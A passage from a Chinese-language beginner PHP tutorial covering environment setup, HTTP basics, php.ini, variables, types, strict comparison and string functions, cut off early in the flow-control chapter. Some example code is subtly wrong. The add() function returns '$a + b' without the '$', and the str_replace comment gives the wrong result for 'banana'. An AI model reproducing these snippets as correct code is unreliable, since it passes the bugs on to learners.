---
title: 零基础PHP教程
date: 2026-11-17
category: 基础知识
tags: [编程语言, PHP]
---

# 零基础 PHP 深度教程

> 一份写给**完全没写过代码的人**的 PHP 教程：从"网页是怎么变成动态的"讲起，一路走到面向对象、Composer、数据库、Web 安全，最后用原生 PHP 写出一个完整的留言板系统，并导览 Laravel 框架。每章末尾附练习题与参考答案。

---

## 这份教程适合谁

- 想做网站、做后端 API、接手现存 PHP 项目（全球仍有近八成网站的服务端涉及 PHP）的人；
- 想以最快路径学会"Web 开发全栈思维"的人——PHP 是唯一"为 Web而生"的主流语言，表单、会话、数据库一气呵成；
- 本系列（C/Java/Python）的读者：PHP 卷把"HTTP 与数据库"这两块前三卷最薄弱的部分讲到了实战深度。

**不需要任何前置知识。** 有 HTTP 基础概念的（读过 Java 教程 13.5 节）前三章可以快进。

## 教程的四条主线

| 主线       | 对应章节    | 解决什么问题                                                 |
| ---------- | ----------- | ------------------------------------------------------------ |
| 语言主线   | 第 1~5 章   | 语法、类型、数组、OOP——PHP 8 的现代语言全貌                  |
| 工程主线   | 第 6 章     | 命名空间、Composer 自动加载、PSR 规范                        |
| Web 主线   | 第 7~9 章   | 表单、Session/Cookie、PDO 数据库——动态网站三大件             |
| 安全与实战 | 第 10~12 章 | SQL 注入/XSS/CSRF/密码哈希原理与防御；留言板项目；Laravel 导览 |

## 环境约定

- **PHP 8.3+**（现代写法：类型声明、match、命名参数、只读属性等）；本教程代码兼容 8.0+，个别 8.1+ 特性会标注；
- 环境二选一：**phpStudy**（Windows 集成环境，图形界面管理 Apache/Nginx + MySQL + 多版本 PHP）或官方 PHP + 内置服务器 `php -S`（第 1 章两种都教）；
- 数据库：MySQL（phpStudy 自带，第 9 章启用）；
- 编辑器：**VS Code + PHP Intelephense 扩展**（免费、智能补全）。

<a id="toc"></a>

## 目录

- [第 1 章　初识 PHP 与环境搭建](#h01) —— 动态网页、phpStudy / php -S、第一个页面
- [第 2 章　变量、类型与运算符](#h02) —— $ 变量、=== 与 ==、插值、类型声明
- [第 3 章　流程控制](#h03) —— elseif、match、foreach、模板替代语法
- [第 4 章　函数与数组](#h04) —— 一种数组两用、全家桶函数、超全局
- [第 5 章　面向对象](#h05) —— 构造器提升、继承、接口、Traits、魔术方法
- [第 6 章　命名空间、Composer 与 PSR](#h06) —— 自动加载、依赖管理、工程规范
- [第 7 章　表单与请求](#h07) —— $_GET/$_POST、验证、PRG、CSRF 预备
- [第 8 章　Session 与 Cookie](#h08) —— 无状态与状态保持、登录实战
- [第 9 章　MySQL 与 PDO](#h09) —— 预处理语句、CRUD、事务
- [第 10 章　Web 安全专题](#h10) —— SQL 注入/XSS/CSRF/密码哈希：攻防原理
- [第 11 章　项目实战：留言板](#h11) —— 认证+数据库+安全防御完整网站
- [第 12 章　Laravel 导览与部署](#h12) —— 框架化手写轮子、生产部署清单
- [附录　排错手册 · 速查表 · 进阶路线](#appendix)

## 怎么用这份教程

1. **按顺序读**。第 7~9 章是 Web 三大件，环环相扣；第 10 章安全专题依赖第 9 章；第 11 章项目用前面一切。
2. **代码必须亲手敲**。PHP 的优势是"改完刷新浏览器就见效"——保持这个正反馈循环。
3. **做每章练习**，先自己做再对答案。
4. **报错不要慌**。PHP 的报错直接打印在页面上（开发模式），附排查手册见附录。

## 四卷系列总览（可选读）

本教程是四卷系列的第三/四卷，各卷定位与衔接关系：

| 卷                 | 语言   | 核心收获                                              | 适合起点        |
| ------------------ | ------ | ----------------------------------------------------- | --------------- |
| C 卷               | C      | 内存、指针、编译链接——机器在做什么                    | 计算机专业起点  |
| Java 卷            | Java   | 强类型 OOP、Spring Boot、JVM——企业级工程              | 想走后端工程化  |
| Python 卷          | Python | 生态与表达力、脚本、爬虫、FastAPI——最快出活           | 想快速见效      |
| **PHP 卷（本书）** | PHP 8  | **HTTP 全链路、数据库、Web 安全——网站是怎么跑起来的** | 想做网站/懂 Web |

四卷的"共同灵魂章节"是同一个主题的四种方言：**数据在内存里长什么样、怎么流动、怎么被保护**。任何一卷学扎实，其他三卷都只是换语法——附录 B.2 有一张四语言对照表收尾用。

## 学习心法

**PHP 的历史包袱最重、现代形态最优雅**——网上资料一半是 PHP 5 时代的过时写法（mysql_* 函数、无类型声明）。三条心法：

1. **认准现代写法**：凡教程出现 `mysql_connect`（不是 mysqli/PDO）、变量前无 `$` 报错、类无类型声明，判定为过时资料直接跳过。本书全部按 PHP 8 现代规范；
2. **HTTP 是主角**：PHP 没有"程序"只有"请求"——每次刷新页面脚本从零执行一次。理解"无状态 + 用 Session 伪造状态"是 Web 开发的临门一脚（第 8 章）；
3. **安全是 PHP 的必修课而非选修课**：它是被注入攻击"教育"最多的语言，所以防御手段也最成熟（第 10 章整章专讲）——学它不是背知识点，是养成反射。

全教程正文约 3 万字、可运行示例 80 余个。学完你应该能：独立写出带登录、带数据库的动态网站、读懂主流 PHP 项目的代码、并对 Web 安全攻防有实战级理解。

## 毕业画像：学完你会成为什么样的人

用六条可验证的能力描述"学完本教程"（也是全书的隐藏大纲）：

1. **能跑通**——从零搭环境、写页面、连数据库、部署上线（第 1、9、12 章）；
2. **能组织**——多文件项目、命名空间、Composer 依赖、PSR 规范（第 5~6 章）；
3. **能交互**——表单、验证、Session 登录、PDO 增删改查（第 7~9 章）；
4. **能防御**——四大漏洞的攻防原理烂熟于心，写代码自带安全反射（第 10 章）；
5. **能集成**——把所有知识组装成完整项目并写出像样的文档（第 11 章）；
6. **能进阶**——读得懂 Laravel 的代码与文档，知道每个组件在替代你的哪个轮子（第 12 章）。

这六条与 C/Java/Python 卷的毕业画像是同一种写法——**能力可以验证，学习才不会漂**。每读完三章回来对一次表，全绿即前进。

祝学习顺利，我们第 1 章见。

---

---

<a id="h01"></a>

# 第 1 章 初识 PHP 与环境搭建

> 本章目标：理解"动态网页"是什么；用 phpStudy 或内置服务器跑起第一个 PHP 页面；看懂 `<?php ?>` 标签与 echo；避开环境坑。

---

## 1.1 PHP 是什么：为 Web 而生的语言

你在浏览器里看到的网页分两种：

- **静态页面**：服务器把 `.html` 文件原样发过来，所有人看到的一模一样；
- **动态页面**：服务器**先执行一段程序**（比如查数据库、拼当前时间、认出你是谁），把程序的**结果**作为 HTML 发过来——千人千面。

PHP 就是写"这段服务端程序"的语言：**PHP: Hypertext Preprocessor**（超文本预处理器，递归缩写），1995 年由 Rasmus Lerdorf 创建，最初就是"管理个人主页"的工具集。它的运行模式：

```
浏览器请求 hello.php
      ▼
Web 服务器（Apache/Nginx/内置服务器）
      ▼
PHP 解释器执行 <?php ... ?> 里的代码，输出结果
      ▼
结果（通常是 HTML）作为响应发回浏览器
```

三个标志性特征（对照系列前作）：

1. **解释执行**（同 Python）：没有编译步骤，改完刷新即见效；
2. **HTML 混写**：PHP 代码可以嵌在 HTML 里，`<?php ?>` 标签切换"代码模式/文本模式"——这是它区别于所有通用语言的形态；
3. **请求即生命**：每次 HTTP 请求，脚本从上到下执行一遍然后结束（没有 main、没有常驻进程）——Web 的无状态模型直接刻在语言的骨子里（第 8 章深化）。

WordPress、Wikipedia、Facebook（早期）都由 PHP 驱动；现代 PHP 8 有着不输任何语言的类型系统与性能（JIT），它与 Python/Java 的对比留在第 12 章展望。

### PHP 三十年与生态版图

认识家史能帮你过滤过时资料。PHP 由 Rasmus Lerdorf 1995 年创建（Personal Home Page Tools），关键里程碑：

| 版本        | 年份    | 意义                                                 |
| ----------- | ------- | ---------------------------------------------------- |
| PHP 5       | 2004    | 现代面向对象起步（存量代码最多，**资料考古重灾区**） |
| PHP 7       | 2015    | 性能翻倍、标量类型声明、`??`——现代化起点             |
| PHP 8       | 2020    | JIT、构造器提升、match、命名参数——**本教程的基准**   |
| PHP 8.1~8.3 | 2021-23 | 枚举、readonly、类常量类型化                         |

**辨别过时资料三查**（网上教程一半是 PHP 5 时代的）：见 `mysql_connect`（不是 mysqli/PDO）→ 直接关闭；见类无类型声明、无可见性修饰 → 存疑；见 `ereg`、`split` 等函数 → 已删除的函数，资料至少十年老。判据一句话：**本书出现的语法就是现代标准，与它冲突的老教程按本书为准**。

生态版图：WordPress（全球约四成网站的内容管理系统）、Wikipedia、Slack（早期）跑在 PHP 上；框架双雄 Laravel（全栈优雅派）与 Symfony（组件化严谨派）；PHP 8 的 JIT 编译让性能进入第一梯队。就业场景：传统企业站、WordPress 二开、中小 API 服务、跨境电商——以及**代码审计**：PHP 项目是 Web 安全审计的经典战场（第 10 章与你的方向暗合）。

## 1.2 环境搭建二选一

### 方式 A：phpStudy（Windows 集成环境，推荐新手）

phpStudy（小皮面板）一键装好 Apache/Nginx + PHP 多版本 + MySQL：

1. 从官网 <https://www.xp.cn> 下载安装；
2. 面板"软件管理/PHP"里确认已装 **PHP 8.x**（没有就点下载，选 8.2/8.3），并在"网站"里启动 Apache 或 Nginx；
3. 网站根目录默认在 `phpstudy_pro\WWW\`（面板"网站"页可见可改）。把 PHP 文件放这里，浏览器访问 `http://localhost/文件名.php` 即可；
4. MySQL 也在面板里一键启停（第 9 章用）。

验证 PHP 版本：面板里看版本号，或命令行 `php -v`（phpStudy 的 PHP 路径类似 `phpstudy_pro\Extensions\php\php8.3.x\`，想全局可用可把它加进 PATH）。

### 方式 B：官方 PHP + 内置服务器（轻量、贴近真实开发）

从 <https://www.php.net/downloads> 下载 Windows 版 zip（选 VS16/VS17 x64 Non Thread Safe 的 zip），解压到如 `D:\php\`，把该目录加入 PATH。验证：

```
php -v          # PHP 8.3.x (cli)
```

然后不需要 Apache——**PHP 自带开发服务器**：

```
cd 你的项目目录
php -S localhost:8000        # 启动开发服务器
```

浏览器访问 `http://localhost:8000/hello.php`。`Ctrl+C` 停止。注意：内置服务器**只用于开发学习**，生产环境用 Nginx/Apache + PHP-FPM（第 12 章）。

**本教程两法通用**：所有代码只依赖 PHP 本体；phpStudy 用户放 WWW 目录用 localhost 访问，内置服务器用户用 8000 端口访问。

### 编辑器

VS Code + **PHP Intelephense** 扩展（自动补全、错误红线、跳转定义）——装完即用，配置为零。

## 1.3 第一个 PHP 页面

在网站根目录新建 `hello.php`，敲入：

```php
<?php
echo "Hello, World!";
```

浏览器访问 `http://localhost/hello.php`，页面显示 `Hello, World!`。右键"查看网页源代码"——你只会看到 `Hello, World!` 这一行**纯文本**，`<?php echo` 等代码痕迹荡然无存：**PHP 代码在服务器上执行完就下班，浏览器永远只见结果**（这就是"服务端语言"）。

逐个认识：

| 元素    | 含义                                                         |
| ------- | ------------------------------------------------------------ |
| `<?php` | PHP 模式开始标签（后跟代码）                                 |
| `echo`  | 输出语句（语言结构，不是函数，可不加括号）                   |
| `;`     | 语句结束分号（漏分号同样是新手第一大错）                     |
| `?>`    | 结束标签——**纯 PHP 文件官方规范建议省略它**（防止文件末尾意外输出空行破坏 HTTP 头），本教程遵循此约定 |

### HTML 与 PHP 混写：PHP 的标志性形态

```php
<!DOCTYPE html>
<html>
<body>
    <h1>今日时间</h1>
    <p>现在是 <?php echo date('Y-m-d H:i:s'); ?></p>
    <ul>
        <?php
        $fruits = ['苹果', '香蕉', '橘子'];
        foreach ($fruits as $f) {
            echo "<li>$f</li>";           // 循环输出 HTML 列表项
        }
        ?>
    </ul>
    <p>共有 <?php echo count($fruits); ?> 种水果</p>
</body>
</html>
```

刷新页面，你得到一个**每次打开都带当前时间的水果列表页**——这就是"动态网页"的全部秘密：**HTML 是模板，PHP 负责填空**。注意 `$f` 双引号内的插值（变量直接被替换成值），第 2 章专讲。

### HTTP 请求与响应：手动发一次

Web 开发的地基是 HTTP 协议本身，用 curl（Windows 10+ 自带）**亲手发一次请求**看全景：

```
curl -v http://localhost/hello.php
```

`-v`（verbose）输出两侧全景：

```
> GET /hello.php HTTP/1.1          ← 请求行：方法 + 路径 + 协议版本
> Host: localhost                  ← 请求头：一堆元信息
> User-Agent: curl/8.x

< HTTP/1.1 200 OK                  ← 响应行：状态码
< Content-Type: text/html; charset=UTF-8    ← 响应头
<
Hello, World!                      ← 响应体（PHP 执行的输出）
```

三块结构（请求行/头/体，响应行/头/体）贯穿全书：第 7 章的表单数据在**请求体**、第 8 章的 Cookie 在**请求头**（`Cookie:`）/响应头（`Set-Cookie:`）、第 10 章的 CSP 防线也是响应头。**现在记住：header() 函数操作的就是这些响应头**，所以它必须在任何输出之前——头在体的前面，这是协议顺序不是 PHP 规矩。

再认识状态码家族（Java/Python 教程同款）：`200` 成功、`301/302` 重定向、`400` 请求有误、`403` 禁止、`404` 没找到、`422` 校验失败、`500` 服务器内部错误。写 PHP 时用 `http_response_code(404)` 主动设置——正确状态码是给前端和爬虫看的合同。

### PHP 是怎么执行的：一次请求的生命周期

把第 1.1 节的简图放大，看清"每次请求发生了什么"：

```
浏览器 GET /hello.php
  ▼
Web 服务器（Apache/Nginx/内置服务器）——按扩展名 .php 判定"这要执行"
  ▼
PHP 解释器接管 hello.php：
  ① 读取整个文件
  ② 编译成字节码（PHP 8 有 JIT 加速，生产还配 opcache 缓存字节码）
  ③ 从第一行执行到最后一行：echo 的内容不断"吐"给 Web 服务器
  ▼
Web 服务器把输出打包成 HTTP 响应发回浏览器
  ▼
脚本的所有变量、连接……全部销毁 —— 下一次请求是全新的一轮
```

最后一步"全部销毁"值得读三遍：**PHP 网页没有全局内存**——想让数据跨请求存活，要么写数据库/文件（第 9 章），要么用 Session/Cookie（第 8 章）。这一模型决定了整个 PHP Web 开发的形态（对照 Java/Node 的"常驻进程"模型，第 12.5 节谈例外）。

## 1.4 三种运行方式与错误显示

PHP 程序的入口与 C/Java 不同——没有 main，**每次请求从文件第一行执行到最后一行**。三种运行方式：

```
浏览器访问 http://localhost/hello.php     # ① Web 方式（主线）
php hello.php                             # ② 命令行执行（CLI 模式，脚本任务用）
php -a                                    # ③ 交互式 shell（类 REPL，试一行代码）
```

**开发期必须打开错误显示**（否则白屏无从排查）。两种途径：

```ini
; php.ini 里（phpStudy 面板可改；官方版在解压目录）
display_errors = On
error_reporting = E_ALL
```

或者代码里临时开（每个脚本顶部）：

```php
<?php
ini_set('display_errors', '1');
error_reporting(E_ALL);
```

报错形态（与 Java 堆栈、Python Traceback 并称三大报错）：

```
Fatal error: Uncaught Error: Call to undefined function ech() in hello.php:2
```

读法：**错误类型 + 说明 + 文件:行号**——一眼定位。附录 A 有完整对照表。

### php.ini 关键配置速查

php.ini 是 PHP 的"系统设置"（phpStudy：面板菜单找"配置文件"；官方版：解压目录 `php.ini-development` 改名为 `php.ini`）。开发期必核对的几行：

```ini
display_errors = On           ; 页面显示报错（开发必开，生产必须 Off！）
error_reporting = E_ALL       ; 报告所有问题（包括 notice）
memory_limit = 256M           ; 单请求内存上限（大文件处理时调）
upload_max_filesize = 20M     ; 上传单文件上限（与 post_max_size 配套）
post_max_size = 24M           ; POST 总量（必须 ≥ upload_max_filesize）
date.timezone = Asia/Shanghai ; 时区（不设警告 + 时间差 8 小时祸根）
extension_dir = "ext"         ; 扩展目录（Windows 常需手动指定）
```

**扩展启用**（分号注释取消即启用）：

```ini
extension=curl          ; HTTP 客户端（Composer 包常用）
extension=mbstring      ; 多字节字符串（中文必开）
extension=pdo_mysql     ; MySQL 的 PDO 驱动（第 9 章生命线）
extension=fileinfo      ; 文件类型探测（第 7 章上传三查用）
extension=openssl       ; 加密/HTTPS
```

验证生效：`php -m` 列出已加载扩展（找 pdo_mysql/mbstring）；`php --ini` 显示当前加载的是哪份 php.ini（多版本环境排错第一步就是确认"改的是正在用的那份"）。改完重启服务（phpStudy 重启 / Ctrl+C 重启内置服务器）才生效——**改配置三步：改、重启、验证**。

## 1.5 新手四大坑

**坑 1：修改了文件浏览器没变化。** 浏览器缓存。Ctrl+F5 强刷；phpStudy 用户确认改的是**网站根目录里**的那个文件。

**坑 2：页面直接显示/下载了 PHP 源码而不是执行。** 你直接双击打开了文件（`file:///` 协议）——PHP 必须经 Web 服务器访问（`http://localhost/...`）。内置服务器没启动也一样。

**坑 3：中文乱码。** 文件保存为 UTF-8（VS Code 右下角编码点一下），HTML 里加 `<meta charset="utf-8">`。双保险后绝无乱码。

**坑 4：500 空白页。** display_errors 没开（1.4 节），先开错误显示再谈排查。

## 1.6 小结

- PHP = 服务端脚本：请求触发执行，输出即响应；代码可嵌 HTML；
- 环境：phpStudy（WWW 目录）或官方 PHP + `php -S localhost:8000`；
- `<?php echo ... ;` 三件套；纯 PHP 文件省略结束标签；
- 开发期 display_errors 必开；报错带文件行号；
- 浏览器永远只见执行结果，不见代码。

## 练习 1

1.（概念）静态页面与动态页面的区别？为什么浏览器"查看源代码"看不到 PHP 代码？
2.（操作）用两种方式（Web、CLI）各运行一次 hello.php，观察输出的差异（CLI 无 HTTP 头、直接输出文本）。
3.（编程）写 `about.php`：HTML 页面含你的名字、爱好，以及一行 PHP 输出的当前日期（date 函数）。
4.（编程）打印 1~5 的乘法阶梯（1、1×2、1×2×3……用循环 echo）。
5.（操作）故意写错一处（漏分号/拼错 echo），观察报错页，记录"文件：行号"信息长什么样。

## 参考答案

**1.** 静态页原样发送固定 HTML；动态页先执行服务端程序、发送其输出结果。PHP 代码只在服务器上执行、不进入响应——浏览器收到的已是"成品 HTML"。

**3.**

```php
<?php $name = '张三'; ?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body>
    <h1>关于我</h1>
    <p>姓名：<?php echo $name; ?></p>
    <p>爱好：编程</p>
    <p>今天是 <?php echo date('Y-m-d'); ?></p>
</body></html>
```

**4.**

```php
<?php
for ($i = 1; $i <= 5; $i++) {
    for ($j = 1; $j <= $i; $j++) {
        echo $j;
        if ($j < $i) echo "×";
    }
    echo "<br>";            // Web 下换行用 <br>；CLI 用 "\n"
}
// 输出：1 / 1×2 / 1×2×3 / 1×2×3×4 / 1×2×3×4×5
```

**5.** 形如 `Parse error: syntax error, unexpected token ";" in D:\www\hello.php on line 3`——错误类型、文件路径、行号三要素，比 Java 堆栈简短、比 Python Traceback 直接。

**[▲ 返回目录](#toc)**

---

<a id="h02"></a>

# 第 2 章 变量、类型与运算符

> 本章目标：$ 变量与命名、八种类型、弱类型与类型声明、`==` vs `===`（PHP 头号考题）、字符串插值与常用函数。

---

## 2.1 变量：$ 开头的名字

PHP 变量一律以 `$` 开头，赋值即创建（动态类型，同 Python）：

```php
<?php
$name = "张三";          // 字符串
$age = 19;               // 整数
$price = 19.99;          // 浮点
$isVip = true;           // 布尔
$nothing = null;         // null：表示“没有值”

echo $name;              // 张三
```

命名规则：`$` + 字母/下划线开头，区分大小写（`$name` 与 `$Name` 是两个变量）；风格采用**小驼峰** `userName`（或蛇形 `user_name`，项目内统一即可）。常量用 define 或 const：

```php
const MAX_RETRY = 3;             // 类外/全局
echo MAX_RETRY;
// MAX_RETRY = 5;               // 常量不可改（运行时报错）
```

**变量作用域**与 C/Java 类似但更"函数本位"：函数内默认看不到外部变量（第 4 章 global 与闭包细讲）。

## 2.2 八种类型

| 类型     | 例               | 说明                                          |
| -------- | ---------------- | --------------------------------------------- |
| `int`    | `42`, `-7`       | 整数（64 位）                                 |
| `float`  | `3.14`           | 浮点（IEEE 754，0.1+0.2 的老毛病全球统一）    |
| `string` | `"hi"` / `'hi'`  | 字符串                                        |
| `bool`   | `true` / `false` | 布尔（不区分大小写：TRUE 也行，但小写是规范） |
| `array`  | `[1, 2]`         | 数组（第 4 章主角，列表+字典一体）            |
| `object` | 实例             | 对象（第 5 章）                               |
| `null`   | `null`           | 无值                                          |
| callable | 函数名           | 可调用（第 4 章函数当参数）                   |

自省与转换：

```php
var_dump($price);              // float(19.99) —— 调试神器：类型+值+长度全打印
gettype($name);                // 'string'
(int) "42";                    // 42 强转
strval(42);                    // '42'
is_int($age);                  // true（is_string/is_array/is_null... 全家桶）
```

**`var_dump()` 是 PHP 的 print_r+type**：开发期排查变量第一工具，务必用熟（`echo` 只能输出字符串，dump 复杂类型用它）。

### 弱类型：PHP 的双面性

PHP 是**弱类型语言**：类型可以自动转换（juggling）：

```php
"5" + 3           // 8：字符串自动转数字参与算术（对照 Python 的 TypeError！）
"3.14" * 2        // 6.28
"abc" + 1         // PHP 8 起：TypeError（乱码字符串不再默默转 0——历史包袱被清理）
5 == "5"          // true（== 比较时转换）
```

弱类型带来便利也埋雷，所以 PHP 5/7/8 逐步引入了**类型声明**——给函数签名"上锁"：

```php
function add(int $a, int $b): int {      // 参数与返回值都声明类型
    return $a + b;
}
add("5", 3);       // PHP 8 默认强制模式："5" 被 coerce 成 int 5，返回 8（宽容转换）
                   // strict_types=1 模式下则直接 TypeError
```

文件首行加 `declare(strict_types=1);` 可开启严格模式（类型不符直接报错）。**现代 PHP 项目规范：全部函数签名带类型声明**——它把"文档 + IDE 补全 + 静态检查"一次买齐（对照 Java 的强类型、Python 的注解，三条路殊途同归）。

### PHP 8 特性总览（现代写法武器库）

教程各章散落的 PHP 8 新语法集中点名——**这些就是"现代 PHP"与"老 PHP"的分界线**：

| 特性           | 版本 | 一句话                                                  | 出处    |
| -------------- | ---- | ------------------------------------------------------- | ------- |
| 命名参数       | 8.0  | `greet(name: "李四")`                                   | 第 4 章 |
| 构造器提升     | 8.0  | 构造参数直接变属性                                      | 第 5 章 |
| match 表达式   | 8.0  | 严格比较不贯穿                                          | 第 3 章 |
| 联合类型       | 8.0  | `int\|string`                                           | 第 4 章 |
| nullsafe `?->` | 8.0  | `$user?->address?->city`（链上任意 null 整体返回 null） | 本章    |
| 箭头函数 fn    | 7.4  | 单表达式闭包自动捕获                                    | 第 4 章 |
| readonly 属性  | 8.1  | 初始化后锁死                                            | 第 5 章 |
| 枚举 enum      | 8.1  | 带方法的常量类                                          | 第 5 章 |
| 纯交叉类型     | 8.1  | `Countable&Stringable`                                  | 进阶    |

nullsafe 展示一下（处理"层层可能为空"的优雅写法）：

```php
// 老写法：三连判空
$city = null;
if ($user !== null) {
    $addr = $user->getAddress();
    if ($addr !== null) {
        $city = $addr->getCity();
    }
}

// nullsafe 一行
$city = $user?->getAddress()?->getCity();     // 任何一环 null → 整体 null，不抛错
```

（对照 Java 教程的 Optional 链、Python 教程的 `.get()` 链——又是同一个问题在第四种语言里的答案。）**使用建议**：写代码时至少用到"类型声明 + match + 构造器提升 + `??`"这四件，你的代码就自动脱离"PHP 5 味"，进入现代区间。

## 2.3 `==` vs `===`：PHP 头号考点

```php
5 == "5"        // true   == 松散比较：先转换类型再比
5 === "5"       // false  === 严格比较：类型不同直接不等
0 == false      // true
"" == null      // true
"abc" == 0      // PHP 7: true（历史灾难）；PHP 8: false（0 与非数字字符串比较改为转字符串比）
```

**松散比较 `==` 的转换规则曾经制造过大量安全漏洞**（如 `"0e123" == "0e456"` 都被科学计数法转成 0 而相等——密码哈希"相等"攻击的经典案例）。现代守则：

> **永远用 `===`（和 `!==`）做比较。** `==` 只在"明确想要松散语义"时使用——而那种时刻几乎不存在。

这一条写进肌肉记忆，第 10 章安全专题会回收这个伏笔。

## 2.4 字符串：单引号、双引号与插值

两种引号的核心区别——**双引号解析变量与转义，单引号原样**：

```php
$name = "张三";
echo "你好，$name";         // 你好，张三（插值！）
echo '你好，$name';         // 你好，$name（原样）
echo "对象属性写法：{$user->name}";   // 复杂表达式用 {} 包住
echo "换行\n制表\t反斜杠\\";
```

**插值**是 PHP 的招牌便利：双引号内变量直接替换，HTML 模板写起来像说话。单引号更快（无解析开销，但现代引擎差异可忽略）——规范是**默认单引号，需要插值才双引号**。

```php
// 拼接运算符是 .（点）——不是 + ！
$full = "Hello" . " " . "World";     // Hello World
$full .= "!";                        // 追加（.= 复合赋值）

// 常用函数
strlen("hello");            // 5（字节长度！中文 UTF-8 每字 3 字节）
mb_strlen("张三");           // 2 —— 多字节安全版（中文必用 mb_ 系列）
mb_strtoupper("abc");       // ABC
str_replace("a", "b", "banana");   // bbnbnnb：全部替换
strpos("hello", "l");       // 2（找不到返回 false）
substr("hello", 1, 3);      // ell
trim("  hi  ");             // 'hi'
sprintf("%s 得 %d 分", "张三", 90);   // '张三 得 90 分'（printf 风格）
strtolower/strtoupper/ucfirst/ucwords
explode(",", "a,b,c");      // ['a','b','c'] 拆成数组（第 4 章）
implode("-", ["a","b"]);    // 'a-b'  数组拼回字符串
number_format(1234567.891, 2)       // '1,234,567.89'
```

**中文陷阱**：`strlen/substr/strpos` 按字节工作，UTF-8 中文会切出乱码——处理中文一律用 **mb_ 前缀**系列（`mb_substr`、`mb_strpos`），并在 php.ini 启用 mbstring 扩展（phpStudy 默认已开）。

### heredoc / nowdoc：大段文本的正确姿势

写长 HTML、SQL、JSON 时，引号转义很痛苦。两种语法专治大段文本：

```php
$name = "张三";
$id = 42;

// heredoc（<<<EOT ... EOT）：像双引号——解析变量与转义
$html = <<<EOT
<div class="user">
    <span>{$name}</span>
    <a href="/profile.php?id={$id}">主页</a>
</div>
EOT;

// nowdoc（<<<'EOT'）：像单引号——原样输出（SQL/代码片段用）
$sql = <<<'SQL'
SELECT id, name
FROM students
WHERE score >= 60
SQL;

echo $html;
```

规则：开始标记（如 `EOT`）自定义，**结束标记必须顶格、与开始一致**（PHP 7.3 起允许缩进）；heredoc 里可插值（`{$name}`），nowdoc 完全字面。比 `"\n" . "..."` 拼接清爽一个量级——第 9 章的 SQL、第 11 章的邮件模板都用它。

### 引用（&）：PHP 的"遥控器"

PHP 5 时代代码里满是 `&`，现代代码少见了，但必须认识它：

```php
$a = 1;
$b = &$a;        // $b 是 $a 的引用（别名，同一块内存的另一个名字）
$b = 99;
echo $a;         // 99 —— 改引用就是改本体（对照第 2.5 节 Python 标签模型的"改共享对象"）

// 函数引用传参：函数内改外部变量（对照 C 指针参数/PHP 老代码的 sort(&$arr)）
function bump(&$n): void {
    $n++;
}
$x = 10;
bump($x);
echo $x;         // 11
```

**现代守则**：数组的 sort/ksort 等内部函数是历史上用引用实现的（`sort(&$array)`），调用时照常传参即可；但**自己写代码优先返回值而非引用**——引用让数据流向难追踪（谁改了它？），函数式风格（进出参数、返回新值）可读性更高。读到老代码的 `&` 知道语义即可，不必模仿。

## 2.5 运算符速览

```php
// 算术：+ - * / % **（/ 对整数也返回浮点，与 Python 同；% 取整后取模）
// 赋值：= += -= *= /= .= %= **=
// 比较：== != === !== < > <= >= <=>（组合比较：返回 -1/0/1）
// 逻辑：&& || ! and or（优先级低于 =，禁用，统一用符号版）
// 三元：条件 ? 真值 : 假值
$grade = $score >= 60 ? "及格" : "不及格";

// null 合并 ??：存在且非 null 则取左，否则取右（PHP 7+，处理“可能不存在的键”神器）
$page = $_GET['page'] ?? 1;              // 第 7 章 $_GET 的标准读法
$name = $user['nickname'] ?? $user['name'] ?? '匿名';   // 可链式兜底

// 太空船 <=>：排序比较函数专用（第 4 章 usort 回收）
```

`??` 是 PHP 的 `or 默认值`（对照 Python 的 `or`、Java 的三元判空），表单读取的标配。

### 类型杂技箱：递增、可变变量与测试表

几个"见到能懂、自己别写"的语言角落（老代码考古必备）：

```php
// ① 字符串递增：PHP 的独门暗器
$a = "a";
$a++;               // 'b'
$z = "z"; $z++;     // 'aa'（进位）—— 数字字符串 "5"++ 得 6，但 "5.1"++ 原样
// 结论：递增递减只对 int/float/null/纯字母串有定义，业务代码用 $i += 1 更清晰

// ② 可变变量：$$ 的套娃（老框架见过）
$v = "name";
$$v = "张三";        // 等价 $name = "张三"
echo $name;          // 张三
// 可读性差，新代码禁用；读老模板引擎源码时认识即可

// ③ 类型测试表（真值判断速查：哪些值当 false）
var_dump((bool) 0);          // false
var_dump((bool) "0");        // false  ← 注意！字符串 "0" 也是假（独此一家）
var_dump((bool) "0.0");      // true   ← "0" 之外的数字串都是真
var_dump((bool) []);         // false  空数组
var_dump((bool) "false");    // true   ← 非空串全真（含 "false" 字样）
var_dump((bool) -1);         // true   ← 非 0 数字全真
```

"假值八兄弟"精确清单背下来：`false、0、0.0、"0"、""、[]、null`（外加未定义变量）。比它宽的判断用 `!== ''` / `!== 0` 精确比对——`empty()` 与 `isset()` 的语义差异也源于此：`empty($x)` 等价 `!$x`（八兄弟全真），`isset($x)` 只查"存在且非 null"。

## 2.6 小结

- `$` 变量、动态类型 + 现代类型声明；`var_dump()` 调试；
- **`===` 永远优先**；`??` 是表单默认值的标配；
- 双引号插值、`.` 拼接（不是 +）；中文用 mb_ 系列；
- `declare(strict_types=1)` 严格模式；常量 const 全大写。

## 练习 2

1.（概念）`5 == "5"`、`5 === "5"`、`"10" - 3` 各是什么？为什么现代 PHP 推荐 `===`？
2.（概念）`echo "总分：$score 分"` 与 `echo '总分：$score 分'` 的区别？
3.（改错）找出两处问题：

```php
<?php
echo "Hello World"        // 漏了什么？
$name = "PHP";
echo '正在学习 $name';
```

4.（编程）定义价格 `$price = 1234.5`，用 number_format 输出 `￥1,234.50`。
5.（编程）用插值输出 HTML 表格：一个 3 行 2 列的表格（姓名/成绩），数据用数组（数组细节下一章，先照抄）。

## 参考答案

**1.** `true`、`false`、`7`（字符串转数字）。`==` 的自动转换规则复杂且曾引发安全漏洞（科学计数法哈希碰撞），`===` 语义清晰无歧义——现代规范一律 `===`。

**2.** 双引号插值输出"总分：95 分"（$score 被替换）；单引号原样输出 `'总分：$score 分'`。

**3.** ① `echo "Hello World"` 行末漏分号；② 单引号不插值，应改双引号 `"正在学习 $name"`。

**4.**

```php
$price = 1234.5;
echo "￥" . number_format($price, 2);     // ￥1,234.50
```

**5.**

```php
$students = [["张三", 90], ["李四", 66], ["王五", 95]];
echo "<table border='1'>";
foreach ($students as [$name, $score]) {
    echo "<tr><td>$name</td><td>$score</td></tr>";
}
echo "</table>";
```

**[▲ 返回目录](#toc)**

---

<a id="h03"></a>

# 第 3 章 流程控制

> 本章目标：if/elseif/else、match 表达式、三种循环、PHP 与 HTML 模板的交替语法（alternative syntax）。学完你能写出"有逻辑的网页"。

---

## 3.1 if / elseif / else

```php
<?php
$score = 85;

if ($score >= 90) {
